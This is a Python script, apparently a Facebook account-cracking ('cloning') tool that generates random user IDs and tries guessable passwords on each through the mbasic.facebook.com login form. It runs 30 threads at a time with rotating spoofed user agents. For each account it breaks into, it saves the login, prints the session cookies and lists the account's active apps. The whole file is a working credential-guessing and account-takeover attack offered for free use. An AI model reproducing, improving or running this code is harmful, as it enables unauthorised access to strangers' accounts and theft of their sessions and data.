#GIFT BY RXS
#GITHUB BINOD-XD
import os
import sys
import time
import requests
import uuid
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.000009)        
        
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\rðŸŽ® %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r ðŸŽ® %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +

def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)



ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
loop = 0
oks = []
cps = []
pcp=[]


logo =                                          ("""   
â”Œâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”‘
â”ƒ\033[1;91m    _____         _____ __  __  ____  _   _ â”ƒ
â”ƒ  / ____|  /\   |_   _|  \/  |/ __ \| \ | | â”ƒ
â”ƒ | (___   /  \    | | | \  / | |  | |  \| | â”ƒ
â”ƒ\033[1;97m  \___ \ / /\ \   | | | |\/| | |  | | . ` | â”ƒ
â”ƒ  ____) / ____ \ _| |_| |  | | |__| | |\  | â”ƒ
â”ƒ |_____/_/    \_\_____|_|  |_|\____/|_| \_|Â©â”ƒ
â””â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”˜
\033[1;32mâ”Œâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” \033[1;97mSAIMON\33[0;m \033[1;32mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”‘
\033[1;32mâ”ƒ   \033[1;32mCREATED BY\33[0;m   :  \033[1;32mSAIMON.CYBER            â”ƒ
â”ƒ   \033[1;32mFACEBOK      : \033[1;32m SAIMONk189              â”ƒ
â”ƒ   \033[1;32mGITHUB       :  \033[1;32mSAIMUN.CYBER.403        â”ƒ
â”ƒ   \033[1;32mTOOL STATUS  :  \033[1;32mTOOL IS FREE            â”ƒ
â”ƒ   \033[1;32mTEAM         :  \033[1;32mPRIVATE                 â”ƒ
â”ƒ   \033[1;32mTOOL VIRSION :  \033[1;32m1.3                     â”ƒ
â”ƒ   \033[1;32mTOOL WORK    :  \033[1;32mONLY DATA               â”ƒ
â””â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â” \033[1;97mSAIMON\33[0;m \033[1;32mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”˜\n""")


def clear():
	os.system('clear')
	jalan (logo)

def id():
	user=[]
	clear()
	#print (logo)
	cod = input ('PUT YOUR CODE: ')
	limit= int(input('EXAMPLE: 2000, 3000, 50000 \nPUT NUMBER OF CLONE : '))
	for num in range(limit):
		nmbr = ''.join(random.choice(string.digits) for _ in range(7))
		#nmx = ''.join(random.choice(string.digits) for _ in range(1))
		#nmp = ''.join(random.choice(string.digits) for _ in range(2))
		user.append(nmbr)
	with ThreadPool(max_workers=30) as saimon:
		clear()
		tl = str(len(user))
		#print (f'total user > '+tl)
		jalan(f'\033[0;97m[{xr}âœ“]\x1b[033;0;96m YOUR TOTAL IDS: {xr}'+tl)
		#jalan(f'\033[0;97m[{xr}âœ“]\033[0;93m PLEASE WAIT YOUR CLONING \n[{xr}âœ“] PROCESS HAS BEEN STARTED')
		jalan(f'\033[0;97m[{xr}âœ“]\033[0;96m USE YOUR MOBILE DATA ')
		jalan(f'\033[0;97m[{xr}âœ“] \x1b[38;5;208mUse Flight Mode For Speed Up')
		#jalan(f'\033[0;97m[{xr}âœ“] \033[0;94mSuper Fast Speed Cloning')
		jalan('\033[1;97mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
		
		for sai in user:
			uid = cod+sai
			pwx = [uid[0:6],uid[0:7],uid[3:11],uid[4:11],uid[5:11],'password','Password','zxcvbnm1']
			saimon.submit(mbasic,uid,pwx,tl)
	print('\033[1;32mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
	print('Crack process has been completed')
	print('Ids saved in ok.txt,cp.txt')
	print('\033[1;32mâ”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”')
	exit()
	
def mbasic(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            wa = random.choice(my_color)
            sys.stdout.write(f'\r%s   [SAIMON] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'POST',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            "origin": 'https://mbasic.facebook.com',
            "referer": 'https://mbasic.facebook.com/',
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[65:80]
            	print('\033[1;92m[\033[1;92mSAIMON-OK[â¤ï¸]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	
            	open('test-OK.txt', 'a').write( uid+' | '+ps+'\n')
            	cek_apk(session,coki)
            	oks.append(cid)
            	break
            elif 'checkpoint' in log_cookies:
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(SAIMON-Cp [ðŸ’”] ' +cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('tast-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	continue
        loop+=1
        
        sys.stdout.write('\r%s   [SAIMON] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        time.sleep(10)
        pass
id()